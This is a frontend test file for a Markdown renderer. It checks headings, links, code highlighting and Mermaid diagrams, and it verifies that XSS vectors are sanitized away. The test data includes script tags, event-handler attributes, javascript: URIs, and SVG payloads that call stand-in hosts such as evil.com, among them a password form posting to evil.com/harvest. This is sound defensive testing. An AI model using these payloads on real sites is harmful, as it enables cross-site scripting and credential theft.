import { render, screen, waitFor } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

// Capture mermaid.initialize config outside mock lifecycle so it survives clearAllMocks.
// The MarkdownRenderer singleton calls initialize only once per module load.
const initializeConfigs: unknown[] = [];

const mocks = vi.hoisted(() => ({
  mermaidRender: vi.fn(),
  mermaidInitialize: vi.fn(),
}));

vi.mock('mermaid', () => ({
  default: {
    initialize: (...args: unknown[]) => {
      initializeConfigs.push(args[0]);
      return mocks.mermaidInitialize(...args);
    },
    render: mocks.mermaidRender,
  },
}));

import {
  CODE_THEME_BG,
  RenderedMarkdown,
  SyntaxHighlightedCode,
} from '../../../src/components/MarkdownRenderer';

describe('RenderedMarkdown', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('renders basic markdown', () => {
    render(<RenderedMarkdown content="# Hello World" />);
    expect(screen.getByRole('heading', { name: 'Hello World' })).toBeInTheDocument();
  });

  it('applies max-width 900px and centers content', () => {
    render(<RenderedMarkdown content="Some text" />);
    const container = screen.getByTestId('rendered-markdown');
    expect(container.className).toContain('max-w-[900px]');
    expect(container.className).toContain('mx-auto');
  });

  it('allows style overrides', () => {
    render(<RenderedMarkdown content="Text" style={{ padding: '32px' }} />);
    const container = screen.getByTestId('rendered-markdown');
    expect(container.style.padding).toBe('32px');
  });

  it('does not render raw HTML from markdown as DOM', () => {
    const { container } = render(
      <RenderedMarkdown
        content={
          '# Report\n\n<script>alert(1)</script><iframe src="https://evil.example"></iframe><span onclick="alert(2)">raw</span>'
        }
      />
    );

    expect(screen.getByRole('heading', { name: 'Report' })).toBeInTheDocument();
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('iframe')).toBeNull();
    expect(container.querySelector('[onclick]')).toBeNull();
    expect(container.innerHTML).toContain('&lt;iframe');
    expect(container.textContent).toContain('https://evil.example');
  });

  it('keeps safe markdown links clickable in a new tab', () => {
    render(<RenderedMarkdown content={'[SAM](https://example.com/docs)'} />);

    const link = screen.getByRole('link', { name: 'SAM' });
    expect(link).toHaveAttribute('href', 'https://example.com/docs');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noreferrer noopener');
  });

  it('preserves relative markdown links for local preview navigation', () => {
    render(
      <RenderedMarkdown
        content={'[Section](#section) [Guide](/docs/guide) [Relative](../README.md)'}
      />
    );

    expect(screen.getByRole('link', { name: 'Section' })).toHaveAttribute('href', '#section');
    expect(screen.getByRole('link', { name: 'Guide' })).toHaveAttribute('href', '/docs/guide');
    expect(screen.getByRole('link', { name: 'Relative' })).toHaveAttribute('href', '../README.md');
  });

  it('fails closed for unsafe markdown link protocols', () => {
    render(
      <RenderedMarkdown
        content={'[bad](javascript:alert(1)) [protocol-relative](//evil.example)'}
      />
    );

    expect(screen.getByRole('link', { name: 'bad' })).toHaveAttribute('href', '#');
    expect(screen.getByRole('link', { name: 'protocol-relative' })).toHaveAttribute('href', '#');
  });

  it('renders syntax-highlighted code blocks', () => {
    const content = '```typescript\nconst x = 1;\n```';
    render(<RenderedMarkdown content={content} />);
    expect(screen.getByText('const')).toBeInTheDocument();
  });

  it('fenced code blocks have a dark background from the nightOwl theme', () => {
    const content = '```typescript\nconst x = 1;\n```';
    const { container } = render(<RenderedMarkdown content={content} />);
    // The inner <pre> from SyntaxHighlightedCode carries the theme background
    const pres = container.querySelectorAll('pre');
    const themedPre = Array.from(pres).find((p) => p.style.backgroundColor !== '');
    expect(themedPre).toBeTruthy();
    // nightOwl theme background is #011627 — must not be transparent or empty
    expect(themedPre!.style.backgroundColor).toBe('rgb(1, 22, 39)');
  });

  it('inline code uses info-tint background, not the nightOwl theme background', () => {
    const content = 'Use `myFunction()` here';
    const { container } = render(<RenderedMarkdown content={content} />);
    const code = container.querySelector('code');
    expect(code).toBeTruthy();
    expect(code!.className).toContain('bg-info-tint');
    // Inline code should NOT have the nightOwl background
    expect(code!.style.backgroundColor).not.toBe('rgb(1, 22, 39)');
  });

  it('renders mermaid code blocks as diagrams', async () => {
    const svgOutput = '<svg data-testid="mock-svg"><text>Mock Diagram</text></svg>';
    mocks.mermaidRender.mockResolvedValue({ svg: svgOutput });

    const content = '```mermaid\ngraph TD\n  A-->B\n```';
    render(<RenderedMarkdown content={content} />);

    await waitFor(() => {
      const diagram = screen.getByTestId('mermaid-diagram');
      expect(diagram.innerHTML).toContain('Mock Diagram');
    });

    expect(mocks.mermaidRender).toHaveBeenCalledWith(
      expect.stringContaining('mermaid-'),
      'graph TD\n  A-->B'
    );
  });

  it('shows error state when mermaid rendering fails', async () => {
    mocks.mermaidRender.mockRejectedValue(new Error('Invalid syntax'));

    const content = '```mermaid\ninvalid diagram\n```';
    render(<RenderedMarkdown content={content} />);

    await waitFor(() => {
      expect(screen.getByText('Mermaid diagram error')).toBeInTheDocument();
      expect(screen.getByText('Invalid syntax')).toBeInTheDocument();
    });
  });

  it('does not wrap mermaid diagrams in a <pre> tag', async () => {
    const svgOutput = '<svg><text>Diagram</text></svg>';
    mocks.mermaidRender.mockResolvedValue({ svg: svgOutput });

    const content = '```mermaid\ngraph TD\n  A-->B\n```';
    render(<RenderedMarkdown content={content} />);

    await waitFor(() => {
      const diagram = screen.getByTestId('mermaid-diagram');
      expect(diagram.innerHTML).toContain('Diagram');
      // The mermaid div must NOT be inside a <pre> element
      expect(diagram.closest('pre')).toBeNull();
    });
  });

  it('renders inline code without mermaid treatment', () => {
    render(<RenderedMarkdown content="Use `graph TD` for diagrams" />);
    expect(screen.getByText('graph TD')).toBeInTheDocument();
    expect(mocks.mermaidRender).not.toHaveBeenCalled();
  });

  it('renders GFM tables', () => {
    const content = '| A | B |\n|---|---|\n| 1 | 2 |';
    render(<RenderedMarkdown content={content} />);
    expect(screen.getByText('A')).toBeInTheDocument();
    expect(screen.getByText('1')).toBeInTheDocument();
  });

  describe('Mermaid XSS sanitization', () => {
    // mermaid.render is mocked here, so these cases hand the library renderer the
    // markup a compromised or buggy Mermaid could emit and check what reaches the
    // DOM. Real Mermaid source is covered in markdown-mermaid-security.test.tsx.
    const MERMAID_BLOCK = '```mermaid\ngraph TD\n  A-->B\n```';

    /** Render a mermaid block with the given SVG and return the diagram's innerHTML. */
    async function renderMermaidSvg(svg: string): Promise<string> {
      mocks.mermaidRender.mockResolvedValue({ svg });
      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
      let html = '';
      await waitFor(() => {
        const diagram = screen.getByTestId('mermaid-diagram');
        expect(diagram.innerHTML).not.toBe('');
        html = diagram.innerHTML;
      });
      return html;
    }

    // Each case keeps a visible label beside the payload, so an empty diagram
    // cannot pass for a sanitized one.
    const xssVectors: Array<{
      name: string;
      svg: string;
      mustContain: string[];
      mustNotContain: string[];
    }> = [
      {
        name: 'script tags in SVG',
        svg: '<svg><text>Diagram</text><script>alert("xss")</script></svg>',
        mustContain: ['Diagram'],
        mustNotContain: ['<script>', 'alert'],
      },
      {
        name: 'event handler attributes',
        svg: '<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>',
        mustContain: ['Safe'],
        mustNotContain: ['onclick', 'onerror', 'alert'],
      },
      {
        name: 'javascript: URIs',
        svg: '<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>',
        mustContain: ['Click me'],
        mustNotContain: ['javascript:', '<a'],
      },
      {
        name: 'external references in <use>',
        svg: '<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>',
        mustContain: ['Safe'],
        mustNotContain: ['evil.com'],
      },
      {
        name: 'an external image (tracking pixel)',
        svg: '<svg><image href="https://evil.example/px.png" width="1" height="1"/><text>Safe</text></svg>',
        mustContain: ['Safe'],
        mustNotContain: ['evil.example'],
      },
      {
        name: 'CSS that loads a remote image',
        svg: '<svg><style>svg{background-image:url(https://evil.example/css.png)}</style><text>Safe</text></svg>',
        mustContain: ['Safe'],
        mustNotContain: ['evil.example'],
      },
      {
        name: 'an HTML label inside foreignObject',
        svg: '<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span><img src="x" onerror="alert(1)"/></div></foreignObject><text>Visible</text></svg>',
        mustContain: ['Visible'],
        mustNotContain: ['foreignObject', '<div', '<span', '<img', 'onerror'],
      },
      {
        name: 'iframe and object inside foreignObject',
        svg: '<svg><foreignObject><div><iframe src="https://evil.com/"></iframe><object data="https://evil.com/evil.swf"></object></div></foreignObject><text>Visible</text></svg>',
        mustContain: ['Visible'],
        mustNotContain: ['foreignObject', '<iframe', '<object', 'evil.com'],
      },
      {
        name: 'form and input inside foreignObject',
        svg: '<svg><foreignObject><div><form action="https://evil.com/harvest"><input type="password" name="pw"/></form></div></foreignObject><text>Visible</text></svg>',
        mustContain: ['Visible'],
        mustNotContain: ['foreignObject', '<form', '<input', 'evil.com'],
      },
    ];

    it.each(xssVectors)('strips $name', async ({ svg, mustContain, mustNotContain }) => {
      const html = await renderMermaidSvg(svg);
      for (const s of mustContain) expect(html).toContain(s);
      for (const s of mustNotContain) expect(html).not.toContain(s);
    });

    const preservationCases: Array<{ name: string; svg: string; mustContain: string[] }> = [
      {
        name: 'valid SVG content (rect, text, fill)',
        svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>',
        mustContain: ['Node A', '<rect', '<text', 'fill="#1a3a32"'],
      },
      {
        name: 'sequence diagram SVG using text elements',
        svg: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300"><rect x="50" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/><text x="110" y="35" text-anchor="middle" fill="#e6f2ee">Alice</text><rect x="250" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/><text x="310" y="35" text-anchor="middle" fill="#e6f2ee">Bob</text><line x1="110" y1="50" x2="310" y2="80" stroke="#9fb7ae"/><text x="210" y="70" text-anchor="middle" fill="#e6f2ee">Hello</text></svg>',
        mustContain: ['Alice', 'Bob', 'Hello', '<text', '<line'],
      },
    ];

    it.each(preservationCases)('preserves $name', async ({ svg, mustContain }) => {
      const html = await renderMermaidSvg(svg);
      for (const s of mustContain) expect(html).toContain(s);
    });

    it('preserves complex Mermaid SVG with gradients, markers, and filters', async () => {
      const complexSvg = [
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">',
        '<defs>',
        '<linearGradient id="grad1"><stop offset="0%" stop-color="#1a3a32"/><stop offset="100%" stop-color="#29423b"/></linearGradient>',
        '<marker id="arrow" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#9fb7ae"/></marker>',
        '</defs>',
        '<g transform="translate(10,10)">',
        '<rect x="0" y="0" width="80" height="40" fill="url(#grad1)" stroke="#29423b" rx="5"/>',
        '<text x="40" y="25" text-anchor="middle" font-size="14" fill="#e6f2ee">Node</text>',
        '<line x1="40" y1="40" x2="40" y2="80" stroke="#9fb7ae" marker-end="url(#arrow)"/>',
        '</g>',
        '</svg>',
      ].join('');
      mocks.mermaidRender.mockResolvedValue({ svg: complexSvg });

      render(<RenderedMarkdown content={MERMAID_BLOCK} />);

      await waitFor(() => {
        const diagram = screen.getByTestId('mermaid-diagram');
        expect(diagram.innerHTML).toContain('<linearGradient');
        expect(diagram.innerHTML).toContain('<marker');
        expect(diagram.innerHTML).toContain('<polygon');
        expect(diagram.innerHTML).toContain('fill="url(#grad1)"');
        expect(diagram.innerHTML).toContain('marker-end="url(#arrow)"');
        expect(diagram.innerHTML).toContain('Node');
      });
    });

    it('calls mermaid.initialize with securityLevel strict and SVG-text labels', () => {
      // The shared pipeline initializes the Mermaid instance once, during the
      // first render in this suite. Configs are captured outside the mock
      // lifecycle (survives clearAllMocks) to assert on them here.
      expect(initializeConfigs).toEqual([
        expect.objectContaining({ securityLevel: 'strict', htmlLabels: false }),
      ]);
    });
  });
});

describe('SyntaxHighlightedCode', () => {
  it('applies the nightOwl theme dark background to the pre element', () => {
    const { container } = render(
      <SyntaxHighlightedCode content="const x = 1;" language="typescript" />
    );
    const pre = container.querySelector('pre');
    expect(pre).toBeTruthy();
    // nightOwl theme background (#011627) rendered as rgb
    expect(pre!.style.backgroundColor).toBe('rgb(1, 22, 39)');
  });

  it('exports CODE_THEME_BG matching the nightOwl theme background', () => {
    expect(CODE_THEME_BG).toBe('#011627');
  });
});
